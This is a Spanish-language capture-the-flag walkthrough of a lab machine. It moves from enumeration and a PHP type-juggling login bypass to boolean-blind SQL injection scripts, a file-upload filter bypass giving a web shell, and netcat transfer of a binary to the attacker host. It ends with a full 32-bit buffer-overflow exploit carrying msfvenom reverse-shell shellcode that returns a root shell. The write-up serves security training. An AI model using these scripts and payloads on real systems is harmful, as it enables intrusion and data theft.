
## Enumeración

Vamos a comenzar con un escaneo de la red para identificar la máquina víctima. Para ello, nos ayudaremos de [[Arp-Scan]]:

```bash
arp-scan -I ens33 --localnet --ignoredups
```

![[Pasted image 20250827203002.png]]

Como podemos observar, ya tenemos la dirección IP de la máquina víctima, que será `192.168.1.74`.

Con esto en mente, vamos a realizar un escaneo general con ayuda de [[Nmap]], con el objetivo de identificar los puertos abiertos:

```bash
nmap -p- --open -sS --min-rate 5000 -v -n -Pn 192.168.1.74 -oG allPorts
```

![[Pasted image 20250827203348.png]]

Como podemos observar, la máquina únicamente tiene abierto el puerto `80`. Por lo tanto, vamos a realizar un escaneo más exhaustivo para identificar el servicio y obtener información adicional:

```bash
nmap -p80 -sCV 192.168.1.74 -oN target
```

![[Pasted image 20250827203947.png]]

Este escaneo no nos proporciona demasiada información, más allá de los datos del servicio HTTP y de las pistas que podemos obtener sobre el sistema operativo, que parece ser Ubuntu.

Vamos a acceder a la página web para ver qué encontramos:

![[Pasted image 20250827204049.png]]

En el apartado de contactos encontramos lo siguiente:

![[Pasted image 20250827204128.png]]

Como podemos ver, tenemos varios correos electrónicos. Toda esta información puede resultar útil más adelante, por lo que vamos a almacenarlos:

- `rmichaels@imf.local`
- `akeith@imf.local`
- `estone@imf.local`

En realidad, no encontramos mucha más información en la página. Por lo tanto, mi primera idea es realizar *fuzzing* para descubrir directorios y recursos que no estén enlazados directamente desde la web.

Para ello, vamos a utilizar Gobuster:

```bash
gobuster dir -u http://192.168.1.74 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20
```

![[Pasted image 20250827204922.png]]

Del escaneo llaman la atención dos directorios: `less` y `server-status`. Sin embargo, después de revisarlos y realizar algunas pruebas adicionales, no conseguimos encontrar nada especialmente útil.

Por lo tanto, vamos a cambiar de enfoque y revisar el código HTML de la página para ver si encontramos alguna pista:

![[Pasted image 20250827205328.png]]

Como podemos observar, hay algo interesante: el doble signo igual del último script y los nombres de los otros dos recursos parecen tener una estructura similar a Base64.

Con esto en mente, vamos a utilizar **curl** para obtener el contenido de la página, filtrar los nombres de los archivos JavaScript y unir los resultados para intentar decodificarlos:

```bash
curl -s -X GET "http://192.168.1.74" | grep -oP 'js/\K[^.]+' | tail -n 3 | xargs | sed 's/ //g' | base64 -d; echo
```

![[Pasted image 20250827205851.png]]

Como podemos ver, obtenemos una cadena que parece contener información interesante. Ahora vamos a tomar el texto que se encuentra entre las llaves y decodificarlo de Base64 para comprobar qué contiene:

```bash
echo "aW1mYWRtaW5pc3RyYXRvcg==" | base64 -d; echo
```

![[Pasted image 20250827210009.png]]

El resultado es `imfadministrator`. Lo primero que se me viene a la mente al ver esto es que podría tratarse de una ruta dentro de la aplicación, ya que todavía no hemos encontrado otros puntos de entrada. Por lo tanto, vamos a comprobar si podemos acceder a ella:

![[Pasted image 20250827210106.png]]

Como podemos observar, la ruta existe y nos muestra un panel de inicio de sesión. Ahora vamos a analizarlo para comprobar si podemos encontrar una forma de eludir la autenticación.

![[Pasted image 20250827210411.png]]

Como vemos, en la imagen, interceptamos la petición y la enviamos a Repeater para analizarla con más detalle.

La respuesta nos muestra un mensaje que indica que la parte relacionada con SQL no está funcionando, aunque el inicio de sesión sigue operativo. Esto nos da una pista: quizá podamos descartar la inyección SQL en este formulario y probar otro método para superar la autenticación.

![[Pasted image 20250827211709.png]]

En este punto, podemos observar que aprovechamos la información que encontramos anteriormente para realizar un [[Temporal/Ataque de Type Juggling]]. Esta técnica permite aprovechar determinadas comparaciones débiles de tipos en PHP para alterar el comportamiento de una validación, siempre que el código sea vulnerable a ello.

Vamos a comprobar el resultado directamente en la página web:

![[Pasted image 20250827212015.png]]

Como podemos ver, hemos conseguido avanzar y encontramos una nueva flag. Al revisarla, observamos que contiene una cadena codificada en Base64, por lo que vamos a comprobar qué información almacena:

![[Pasted image 20250827212119.png]]

El mensaje nos indica que continuemos con el `cms`. Por lo tanto, vamos a seguir esa pista y explorar esta nueva funcionalidad.

![[Pasted image 20250827212731.png]]

Nos encontramos con otra página web que utiliza el parámetro `pagename` para cargar recursos. En este punto, podemos comprobar si la forma en la que se procesa ese parámetro es vulnerable a una inyección SQL.

![[Pasted image 20250827213232.png]]

![[Pasted image 20250827213209.png]]

Como podemos observar, las pruebas parecen indicar que la aplicación es vulnerable a [[SQLI]].

Además, al modificar la consulta, vemos que cuando la condición se cumple aparece el mensaje `Welcome to the IMF Administration.`. Esto nos hace pensar que podemos estar ante una inyección SQL basada en condiciones booleanas, en la que la respuesta de la página nos permite distinguir entre una condición verdadera y una falsa.

Con esto en mente, vamos a intentar enumerar la base de datos mediante un script en Python 3.

### Enumeración de bases de datos

Primero vamos a identificar los nombres de las bases de datos disponibles. Para ello, utilizaremos el siguiente script:

```python
#!/usr/bin/python3

from pwn import *
import requests, sys, signal, string

# Variables globales
main_url = "http://192.168.1.74/imfadministrator/cms.php?pagename=home"
cookie = {"PHPSESSID": "ni2l0bfeou0ppfnvb8on8pavf6"}
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + ",_"

# Ctrl+C
def def_handler(sing, frame):
    print("\n\n[!] Saliendo....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def sqlInyection():

    data = ""

    p1 = log.progress("Fuerza Bruta")
    p2 = log.progress("Data")

    for position in range(1, 100):
        for character in characters:
            payload = main_url + "' and substring((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s" % (position, character)

            r = requests.get(payload, cookies=cookie)
            p1.status(payload)

            if "Welcome to the IMF Administration." in r.text:
                data += character
                p2.status(data)
                break

def main():
    sqlInyection()

if __name__ == '__main__':
    main()
```

![[Pasted image 20250827215841.png]]

Como podemos ver, conseguimos enumerar las bases de datos disponibles:

- `information_schema`
- `admin`
- `mysql`
- `performance_schema`
- `sys`

En mi caso, la que más llama la atención es `admin`, así que vamos a investigar qué tablas contiene.

### Enumeración de tablas

Para obtener los nombres de las tablas de la base de datos `admin`, podemos adaptar el script anterior:

```python
#!/usr/bin/python3

from pwn import *
import requests, sys, signal, string

# Variables globales
main_url = "http://192.168.1.74/imfadministrator/cms.php?pagename=home"
cookie = {"PHPSESSID": "ni2l0bfeou0ppfnvb8on8pavf6"}
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + ",_"

# Ctrl+C
def def_handler(sing, frame):
    print("\n\n[!] Saliendo....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def sqlInyection():

    data = ""

    p1 = log.progress("Fuerza Bruta")
    p2 = log.progress("Data")

    for position in range(1, 100):
        for character in characters:
            payload = main_url + "' and substring((select group_concat(table_name) from information_schema.tables where table_schema='admin'),%d,1)='%s" % (position, character)

            r = requests.get(payload, cookies=cookie)
            p1.status("")

            if "Welcome to the IMF Administration." in r.text:
                data += character
                p2.status(data)
                break

def main():
    sqlInyection()

if __name__ == '__main__':
    main()
```

![[Pasted image 20250827220142.png]]

Como vemos, encontramos una tabla llamada `pages`. Ahora vamos a revisar las columnas que contiene para saber qué información podemos extraer.

### Enumeración de columnas

Para identificar las columnas de la tabla `pages`, adaptamos nuevamente el script:

```python
#!/usr/bin/python3

from pwn import *
import requests, sys, signal, string

# Variables globales
main_url = "http://192.168.1.74/imfadministrator/cms.php?pagename=home"
cookie = {"PHPSESSID": "ni2l0bfeou0ppfnvb8on8pavf6"}
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + ",_"

# Ctrl+C
def def_handler(sing, frame):
    print("\n\n[!] Saliendo....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def sqlInyection():

    data = ""

    p1 = log.progress("Fuerza Bruta")
    p2 = log.progress("Data")

    for position in range(1, 100):
        for character in characters:
            payload = main_url + "' and substring((select group_concat(column_name) from information_schema.columns where table_schema='admin' and table_name='pages'),%d,1)='%s" % (position, character)

            r = requests.get(payload, cookies=cookie)
            p1.status("")

            if "Welcome to the IMF Administration." in r.text:
                data += character
                p2.status(data)
                break

def main():
    sqlInyection()

if __name__ == '__main__':
    main()
```

![[Pasted image 20250827220338.png]]

Como podemos observar, tenemos las columnas `id`, `pagename` y `pagedata`.

Ahora, vamos a consultar los valores de `pagename` para identificar las páginas que están registradas en la aplicación:

```python
#!/usr/bin/python3

from pwn import *
import requests, sys, signal, string

# Variables globales
main_url = "http://192.168.1.74/imfadministrator/cms.php?pagename=home"
cookie = {"PHPSESSID": "ni2l0bfeou0ppfnvb8on8pavf6"}
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + ",_"

# Ctrl+C
def def_handler(sing, frame):
    print("\n\n[!] Saliendo....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def sqlInyection():

    data = ""

    p1 = log.progress("Fuerza Bruta")
    p2 = log.progress("Data")

    for position in range(1, 100):
        for character in characters:
            payload = main_url + "' and substring((select group_concat(pagename) from pages),%d,1)='%s" % (position, character)

            r = requests.get(payload, cookies=cookie)
            p1.status("")

            if "Welcome to the IMF Administration." in r.text:
                data += character
                p2.status(data)
                break

def main():
    sqlInyection()

if __name__ == '__main__':
    main()
```

![[Pasted image 20250827220928.png]]

Como podemos observar, encontramos varias subpáginas registradas en la web. Sin embargo, todavía hay algunas que nos llaman la atención y que debemos revisar con más detalle.

Una de ellas es `tutorials-incomplete`, así que vamos a acceder a ella:

![[Pasted image 20250827221010.png]]

Como podemos ver, encontramos un código QR. Vamos a escanearlo para comprobar si contiene información que nos permita continuar:

![[Pasted image 20250827221100.png]]

El código QR nos proporciona otra flag. Vamos a revisar su contenido para ver qué nos indica:

![[Pasted image 20250827221228.png]]

Como podemos observar, esta flag contiene una especie de ruta. Por lo tanto, vamos a acceder a ella para comprobar qué encontramos:

![[Pasted image 20250827221319.png]]

Acabamos de encontrar una página que permite subir archivos. A primera vista, parece aceptar diferentes tipos de archivos, así que vamos a realizar algunas pruebas para comprobar qué restricciones aplica.

![[Pasted image 20250827221611.png]]

Intentamos subir un archivo PHP, pero la aplicación no nos permite hacerlo. Esto nos hace pensar que existe algún tipo de validación que restringe los formatos aceptados.

En este caso, podemos interceptar la petición de subida con Burp Suite y analizar cómo se envía el archivo. Así podremos comprobar si las validaciones implementadas son suficientes o si existe alguna forma de eludirlas mediante un [[Abuso de subida de archivos]].

![[Pasted image 20250828081734.png]]

Ya tenemos capturada la petición y podemos analizar los campos que intervienen en la subida. A partir de aquí, vamos a probar diferentes modificaciones para determinar qué validaciones utiliza la aplicación.

Después de varias pruebas, encontramos una forma de eludir parte de la validación. Para entender lo que estamos haciendo, debemos tener en cuenta que las cadenas de texto pueden representarse mediante diferentes codificaciones.

En este caso, observamos que la aplicación parece detectar la palabra `system` dentro del archivo. Por lo tanto, vamos a revisar cómo se representa esa cadena en hexadecimal:

```bash
echo "system" | xxd
```

![[Pasted image 20250828082636.png]]

La parte que nos interesa es la representación hexadecimal de los caracteres. Podemos expresar la cadena de la siguiente manera:

```text
\x73\x79\x73\x74\x65\x6d
```

Ahora, vamos a probar esta representación en la petición que estamos enviando mediante Burp Suite:

![[Pasted image 20250828082831.png]]

Como podemos ver, estamos combinando diferentes modificaciones en la petición: cambiamos la extensión del archivo, modificamos el `Content-Type`, alteramos la cabecera del contenido para intentar superar la validación basada en los *magic bytes* y representamos la cadena `system` mediante secuencias hexadecimales.

Con estas modificaciones, enviamos la petición y comprobamos si conseguimos subir el archivo:

![[Pasted image 20250828083031.png]]

La subida parece haber funcionado. Ahora vamos a revisar la respuesta del servidor para ver si nos proporciona alguna información adicional:

![[Pasted image 20250828083240.png]]

Como podemos observar, la respuesta contiene un identificador que podría corresponder al nombre con el que se ha almacenado el archivo.

Recordemos que anteriormente encontramos una referencia a la ruta `uploads/`. Por lo tanto, vamos a comprobar si podemos acceder al archivo utilizando ese directorio y el identificador que nos ha proporcionado el servidor.

Sin embargo, durante las pruebas nos percatamos de que existe una incompatibilidad entre los *magic bytes* y la extensión del archivo. Vamos a corregir este detalle para que ambos coincidan:

![[Pasted image 20250828083820.png]]

Como vemos, el `Content-Type` no parece ser determinante en esta prueba, pero sí debemos prestar atención a la extensión y a los *magic bytes*, ya que la aplicación parece comprobar la coherencia entre ambos.

Una vez corregido el archivo, vamos a utilizar el identificador devuelto por el servidor para acceder a él desde el directorio `uploads`:

![[Pasted image 20250828083921.png]]

Como podemos observar, el servidor interpreta el código PHP y conseguimos ejecutar comandos. Esto confirma que hemos encontrado una forma de aprovechar la subida de archivos para ejecutar código en el servidor.

Con este resultado, vamos a modificar el archivo para que acepte un parámetro y nos permita ejecutar los comandos que necesitemos:

![[Pasted image 20250828092605.png]]

Perfecto, ahora vamos a comprobar si podemos ejecutar comandos a través de ese parámetro:

![[Pasted image 20250828092710.png]]

Como vemos, la ejecución funciona. El siguiente paso será intentar establecer una shell inversa para obtener una sesión interactiva en la máquina víctima.

![[Pasted image 20250828093032.png]]

![[Pasted image 20250828093043.png]]

Ya tenemos todo preparado, así que vamos a intentar establecer la conexión:

![[Pasted image 20250828093105.png]]

Como podemos ver, hemos conseguido conectarnos a la máquina. En este punto, vamos a realizar el tratamiento de la TTY y comenzar una enumeración local para buscar posibles vías de escalada de privilegios.

Durante esta enumeración encontramos otra flag:

![[Pasted image 20250828093628.png]]

Vamos a revisar su contenido para ver si nos proporciona alguna pista:

![[Pasted image 20250828093724.png]]

El resultado es `agentservices`. Esto me hace pensar que podría existir algún servicio relacionado con un agente, por lo que vamos a buscar archivos con ese nombre dentro del sistema:

```bash
find / -name agent 2>/dev/null
```

![[Pasted image 20250828093937.png]]

Como vemos, encontramos dos resultados relacionados con `agent`. Uno de ellos es un binario, por lo que vamos a comenzar analizando ese archivo.

![[Pasted image 20250828094328.png]]

Al revisar el binario, vemos que está compilado para Linux de 32 bits.

![[Pasted image 20250828094121.png]]

Ahora, vamos a revisar el otro archivo encontrado:

![[Pasted image 20250828094453.png]]

Como podemos observar, el archivo pertenece a `root` y los demás usuarios únicamente tienen permisos de lectura. Al revisar su contenido, vemos que parece estar relacionado con un servicio que utiliza el puerto `7788`.

Vamos a comprobar las conexiones TCP activas para verificar si hay algún servicio escuchando en ese puerto:

```bash
netstat -nat
```

![[Pasted image 20250828094830.png]]

Como vemos, efectivamente encontramos una conexión asociada al puerto `7788`. Ahora vamos a revisar los procesos para identificar si el servicio se encuentra en ejecución:

```bash
ps aux | grep agent
```

![[Pasted image 20250828095025.png]]

Como podemos observar, el resultado que aparece corresponde a `grep agent`, ejecutado por `www-data`. Por lo tanto, todavía no hemos identificado el proceso que estamos buscando, que debería ejecutarse con privilegios de `root`.

Una posibilidad es que el servicio se inicie cuando un cliente se conecta al puerto. Para comprobarlo, vamos a intentar establecer una conexión local en segundo plano:

```bash
nc localhost 7788 &>/dev/null &
```

Después, volvemos a revisar los procesos:

```bash
ps aux | grep agent
```

![[Pasted image 20250828095503.png]]

Como vemos, el servicio aparece ejecutándose como `root`. Esto nos indica que la conexión provoca la ejecución de un proceso con privilegios elevados.

Además, el binario no parece tener permisos SUID ni capacidades especiales que expliquen directamente su ejecución privilegiada. Por lo tanto, vamos a centrar el análisis en el comportamiento del servicio y en la funcionalidad del propio programa.

Ahora, vamos a conectarnos de nuevo para comprobar qué nos solicita:

![[Pasted image 20250828095846.png]]

Como podemos observar, el programa nos pide un `Agent ID`, pero todavía no conocemos el valor correcto.

Para buscar pistas, podemos utilizar `strings` y revisar las cadenas legibles que contiene el binario:

```bash
strings /usr/local/bin/agent
```

Después de revisar los resultados, no encontramos información suficiente para identificar el valor que necesitamos. Por lo tanto, vamos a transferir el binario a nuestra máquina y analizarlo con ayuda de [[Ghidra]].

### Análisis del binario con Ghidra

Primero vamos a transferir el archivo desde la máquina víctima hasta nuestra máquina atacante.

En la máquina atacante, dejamos Netcat escuchando y redirigimos los datos recibidos hacia un archivo:

```bash
nc -nlvp 444 > agent
```

Desde la máquina víctima, enviamos el contenido del binario hacia nuestra máquina:

```bash
nc 192.168.1.108 444 < /usr/local/bin/agent
```

![[Pasted image 20250828102459.png]]

Como podemos ver, ya tenemos el archivo en nuestra máquina y podemos comenzar a analizarlo.

Abrimos el binario con [[Ghidra]]:

![[Pasted image 20250828103018.png]]

Una vez cargado, nos dirigimos a la función `main` para comprender cómo funciona el programa y qué comprobaciones realiza.

![[Pasted image 20250828103646.png]]

Vamos a explicar lo que observamos en el código.

En el punto `1`, vemos que se utiliza `fgets` para almacenar la entrada que introducimos cuando el programa nos solicita el `Agent ID`.

En el punto `2`, esa entrada se compara con la variable `local_28`, que podemos observar en el punto `3`.

Si revisamos el código con más detenimiento, en el punto `4` vemos que se utiliza `asprintf` para almacenar una cadena en esa variable. La cadena está representada mediante un valor hexadecimal.

Ghidra nos permite interpretar esa representación y convertirla para ver el valor que contiene. Vamos a utilizar esta funcionalidad para descubrir cuál es el `Agent ID` válido:

![[Pasted image 20250828104048.png]]

Como resultado, obtenemos el siguiente valor:

- `48093572`

![[Pasted image 20250828104151.png]]

Ahora, vamos a introducir este valor en el programa para comprobar si conseguimos avanzar:

![[Pasted image 20250828104151.png]]

Como podemos observar, el valor es válido y logramos acceder al menú del programa.

### Análisis de la vulnerabilidad

Ahora, que conocemos el `Agent ID`, vamos a continuar analizando el programa en busca de posibles vulnerabilidades.

En una de las opciones del menú, concretamente en la opción `3`, encontramos una funcionalidad que permite enviar un reporte. Vamos a revisar cómo se procesa esa entrada:

![[Pasted image 20250828105227.png]]

Como podemos ver, el programa utiliza la función `gets` para leer la entrada y almacenarla en la variable `local_a8`, cuyo búfer tiene un tamaño inicial de `164` bytes.

El problema es que `gets` no comprueba el tamaño de la entrada antes de almacenarla. Por lo tanto, si introducimos más datos de los que caben en el búfer, podemos sobrescribir memoria adyacente y provocar un **Buffer Overflow**.

Vamos a comprobar si esto ocurre introduciendo una cadena larga en la opción `3`:

![[Pasted image 20250828105640.png]]

Como podemos observar, el programa falla y vemos que se ha alterado el estado de la memoria. Esto nos indica que podemos continuar investigando el Buffer Overflow para determinar si es posible controlar el flujo de ejecución.

Para realizar estas pruebas, en mi caso voy a utilizar un contenedor con Kali Linux, ya que mi sistema Arch Linux no está preparado para este análisis.

Una vez preparado el entorno, ejecutamos el binario con GDB:

```bash
gdb ./agent -q
```

![[Pasted image 20250828110849.png]]

Ahora, vamos a ejecutar el programa y provocar nuevamente el Buffer Overflow:

![[Pasted image 20250828111053.png]]

Después de introducir la cadena, observamos el siguiente resultado:

![[Pasted image 20250828111137.png]]

Como vemos, conseguimos sobrescribir el registro `EIP`, que en arquitecturas x86 de 32 bits contiene la dirección de la siguiente instrucción que se ejecutará.

Por lo tanto, nuestro objetivo es identificar cuántos caracteres necesitamos para alcanzar exactamente esa posición y controlar el valor de `EIP`.

### Cálculo del offset

Primero vamos a crear un patrón de 200 caracteres, que es aproximadamente la cantidad de datos que utilizamos para provocar el fallo:

```bash
pattern create 200
```

![[Pasted image 20250828111949.png]]

Ahora, introducimos la cadena generada por GEF en el programa:

![[Pasted image 20250828112101.png]]

Como podemos observar, el valor de `EIP` ha cambiado y ahora contiene una parte del patrón que introdujimos.

Con ayuda de GEF, podemos calcular cuántos caracteres hay antes de alcanzar la posición que sobrescribe `EIP`:

```bash
pattern offset
```

![[Pasted image 20250828112318.png]]

El resultado nos indica que necesitamos `168` caracteres para alcanzar el punto en el que sobrescribimos `EIP`.

Para comprobarlo, vamos a generar una cadena formada por 168 letras `A`, seguidas de cuatro letras `B`. Si el cálculo es correcto, deberíamos ver las cuatro `B` en el registro `EIP`:

```bash
python3 -c "print('A'*168 + 'B'*4)"
```

![[Pasted image 20250828112659.png]]

Introducimos el resultado en el programa y comprobamos qué sucede:

![[Pasted image 20250828112753.png]]

Como podemos ver, el registro contiene el valor esperado. Por lo tanto, hemos confirmado que el offset es de `168` bytes.

### Revisión de las protecciones

Ahora, vamos a revisar qué protecciones de seguridad tiene habilitadas el binario:

![[Pasted image 20250828112841.png]]

Como vemos, en el resultado, las protecciones relevantes aparecen deshabilitadas. Esto facilita el análisis, ya que no contamos con algunas de las mitigaciones que normalmente dificultan la explotación de un Buffer Overflow.

Sin embargo, todavía debemos comprobar el comportamiento de ASLR (*Address Space Layout Randomization*), una técnica que aleatoriza determinadas direcciónes de memoria para dificultar la reutilización de direcciónes predecibles.

En la máquina donde realizamos las pruebas, consultamos su configuración con el siguiente comando:

```bash
cat /proc/sys/kernel/randomize_va_space
```

![[Pasted image 20250828113221.png]]

Como podemos observar, ASLR está habilitado.

Para comprobar si las direcciónes de memoria de las bibliotecas cambian entre ejecuciónes, podemos ejecutar repetidamente `ldd` sobre el binario y observar la dirección de `libc`:

```bash
for i in $(seq 1 20); do ldd agent | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
```

![[Pasted image 20250828113611.png]]]

Como vemos, las direcciónes cambian entre las ejecuciónes. Esto confirma que la dirección de la biblioteca no es fija en este entorno.

En arquitecturas de 32 bits, el espacio de direcciónes es más reducido que en arquitecturas de 64 bits. Dependiendo de la configuración y de las condiciones del sistema, esto puede hacer que determinadas direcciónes vuelvan a aparecer después de varias ejecuciónes.

Podemos realizar más iteraciones para observar si se repite una dirección concreta:

```bash
for i in $(seq 1 10000); do ldd agent | grep libc | awk 'NF{print $NF}' | tr -d '()'; done | grep "0xf7634000"
```

![[Pasted image 20250828113851.png]]

En cualquier caso, encontrar una dirección repetida en `libc` no significa que todas las direcciónes del proceso sean predecibles. Por lo tanto, vamos a considerar otra alternativa para controlar el flujo de ejecución sin depender directamente de una dirección dinámica de esa biblioteca.

### Técnica ret2reg

Para continuar, vamos a utilizar la técnica `ret2reg`. La idea consiste en aprovechar un registro que ya apunta a una zona de memoria bajo nuestro control y transferir la ejecución a esa dirección.

Primero vamos a revisar el contenido de la pila para intentar localizar la cadena que introdujimos:

```bash
x/100wx $esp
```

![[Pasted image 20250828114832.png]]

Como podemos observar, no encontramos la cadena en la zona de memoria que estamos examinando. Por lo tanto, vamos a ampliar la búsqueda hacia direcciónes anteriores:

```bash
x/100wx $esp-200
```

![[Pasted image 20250828115008.png]]

Ahora, sí encontramos parte de la cadena que introdujimos.

Vamos a revisar otros registros para comprobar si alguno apunta directamente a esa zona de memoria. En este caso, nos interesa el registro `EAX`:

![[Pasted image 20250828115134.png]]

Para inspeccionar la memoria a la que apunta, utilizamos:

```bash
x/16wx $eax
```

![[Pasted image 20250828115244.png]]

Perfecto, encontramos varias letras `A`, lo que indica que `EAX` apunta a una zona que contiene parte de nuestra entrada.

Ahora, vamos a retroceder un poco para localizar el comienzo de la cadena:

```bash
x/16wx $eax-8
```

![[Pasted image 20250828115345.png]]

Como podemos ver, ya tenemos localizada la zona que nos interesa. Con esto en mente, vamos a preparar el *shellcode* utilizando [[msfvenom]]:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.108 LPORT=448 -b '\x00\x0a\x0d' -f c
```

![[Pasted image 20250828115725.png]]

Una vez generado el *shellcode*, vamos a preparar un script en Python 3 para construir el *payload*.

Primero guardamos el *shellcode* en formato `bytes`. Recordemos que necesitamos `168` bytes antes de sobrescribir `EIP` y que el *shellcode* ocupa una parte de ese espacio.

Por lo tanto, completaremos la longitud restante con letras `A`, de manera que la suma del *shellcode* y el relleno alcance el offset de `168` bytes.

```python
#!/usr/bin/python3

from struct import pack

shellcode = (
    b"\xbf\x74\x48\x87\x1f\xdd\xc6\xd9\x74\x24\xf4\x5a\x29\xc9"
    b"\xb1\x12\x31\x7a\x12\x83\xea\xfc\x03\x0e\x46\x65\xea\xdf"
    b"\x8d\x9e\xf6\x4c\x71\x32\x93\x70\xfc\x55\xd3\x12\x33\x15"
    b"\x87\x83\x7b\x29\x65\xb3\x35\x2f\x8c\xdb\x05\x67\x6f\x77"
    b"\xee\x7a\x70\x86\x2e\xf3\x91\x38\xc8\x54\x03\x6b\xa6\x56"
    b"\x2a\x6a\x05\xd8\x7e\x04\xf8\xf6\x0d\xbc\x6c\x26\xdd\x5e"
    b"\x04\xb1\xc2\xcc\x85\x48\xe5\x40\x22\x86\x66"
)

offset = 168  # Bytes necesarios antes de sobrescribir EIP
payload = shellcode + b"A" * (offset - len(shellcode))
```

Ahora, debemos decidir qué dirección vamos a utilizar para sobrescribir `EIP`. Como hemos observado que `EAX` apunta a una zona de memoria que contiene nuestra entrada, podemos buscar una instrucción dentro del propio binario que permita saltar a la dirección almacenada en ese registro.

Para ello, vamos a utilizar una herramienta de Metasploit que permite consultar las instrucciones en ensamblador:

```bash
/opt/metasploit/tools/exploit/nasm_shell.rb
```

![[Pasted image 20250828121255.png]]

![[Pasted image 20250828121421.png]]

Como vemos, la instrucción `call eax` se representa mediante los bytes `FF D0`.

Ahora, vamos a buscar esa secuencia dentro del binario:

```bash
objdump -d agent | grep -i "FF D0"
```

![[Pasted image 20250828121713.png]]

Como podemos observar, encontramos una instrucción `call *%eax` en la dirección `0x8048563`.

Esta dirección pertenece al propio binario y, según las protecciones que revisamos anteriormente, podemos utilizarla en nuestras pruebas sin depender de la dirección dinámica de `libc`.

Con esto en mente, el objetivo es que `EIP` apunte a esa instrucción. Cuando se ejecute `call eax`, el procesador transferirá la ejecución a la dirección almacenada en `EAX`, que apunta a nuestra entrada.

Por lo tanto, vamos a completar el *payload*:

```python
#!/usr/bin/python3

from struct import pack

shellcode = (
    b"\xbf\x74\x48\x87\x1f\xdd\xc6\xd9\x74\x24\xf4\x5a\x29\xc9"
    b"\xb1\x12\x31\x7a\x12\x83\xea\xfc\x03\x0e\x46\x65\xea\xdf"
    b"\x8d\x9e\xf6\x4c\x71\x32\x93\x70\xfc\x55\xd3\x12\x33\x15"
    b"\x87\x83\x7b\x29\x65\xb3\x35\x2f\x8c\xdb\x05\x67\x6f\x77"
    b"\xee\x7a\x70\x86\x2e\xf3\x91\x38\xc8\x54\x03\x6b\xa6\x56"
    b"\x2a\x6a\x05\xd8\x7e\x04\xf8\xf6\x0d\xbc\x6c\x26\xdd\x5e"
    b"\x04\xb1\xc2\xcc\x85\x48\xe5\x40\x22\x86\x66"
)

offset = 168  # Bytes necesarios antes de sobrescribir EIP

# Dirección obtenida con:
# objdump -d agent | grep -i "FF D0"
# 8048563: ff d0    call *%eax

payload = shellcode + b"A" * (offset - len(shellcode)) + pack("<I", 0x8048563)
```

Como podemos ver, utilizamos `pack("<I", ...)` para representar la dirección en formato *little-endian*, que es el formato de bytes que necesitamos para esta arquitectura.

### Automatización de la conexión

Hasta este punto hemos construido el *payload*, pero todavía necesitamos enviarlo al servicio que se ejecuta en el puerto `7788`.

Recordemos que el programa se inicia cuando se establece una conexión con ese puerto y que hemos observado que el proceso se ejecuta como `root`. Por lo tanto, vamos a preparar un script que se conecte al servicio, introduzca el `Agent ID`, seleccione la opción `3` y envíe el *payload*.

```python
#!/usr/bin/python3

from struct import pack
import socket

shellcode = (
    b"\xbf\x74\x48\x87\x1f\xdd\xc6\xd9\x74\x24\xf4\x5a\x29\xc9"
    b"\xb1\x12\x31\x7a\x12\x83\xea\xfc\x03\x0e\x46\x65\xea\xdf"
    b"\x8d\x9e\xf6\x4c\x71\x32\x93\x70\xfc\x55\xd3\x12\x33\x15"
    b"\x87\x83\x7b\x29\x65\xb3\x35\x2f\x8c\xdb\x05\x67\x6f\x77"
    b"\xee\x7a\x70\x86\x2e\xf3\x91\x38\xc8\x54\x03\x6b\xa6\x56"
    b"\x2a\x6a\x05\xd8\x7e\x04\xf8\xf6\x0d\xbc\x6c\x26\xdd\x5e"
    b"\x04\xb1\xc2\xcc\x85\x48\xe5\x40\x22\x86\x66"
)

offset = 168  # Bytes necesarios antes de sobrescribir EIP

# Dirección obtenida con:
# objdump -d agent | grep -i "FF D0"
# 8048563: ff d0    call *%eax

payload = (
    shellcode
    + b"A" * (offset - len(shellcode))
    + pack("<I", 0x8048563)
    + b"\n"
)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 7788))

s.recv(1024)  # Recibimos la respuesta del servicio

s.send(b"48093572\n")  # Enviamos el Agent ID
s.recv(1024)

s.send(b"3\n")  # Seleccionamos la opción 3
s.recv(1024)

s.send(payload)  # Enviamos el payload
```

Con esto, el script queda preparado para interactuar con el servicio local y enviar la entrada que hemos construido.

Ahora, vamos a dejar el puerto `448` en escucha, que es el puerto configurado en el *shellcode* generado con [[msfvenom]], y comprobaremos si conseguimos recibir la conexión:

![[Pasted image 20250828123723.png]]

Como podemos observar, hemos conseguido obtener una shell con privilegios de `root`.

Ahora, vamos a realizar el tratamiento de la TTY para trabajar de una manera más cómoda y revisar el sistema en busca de la última flag:

![[Pasted image 20250828123900.png]]

**¡Máquina terminada!**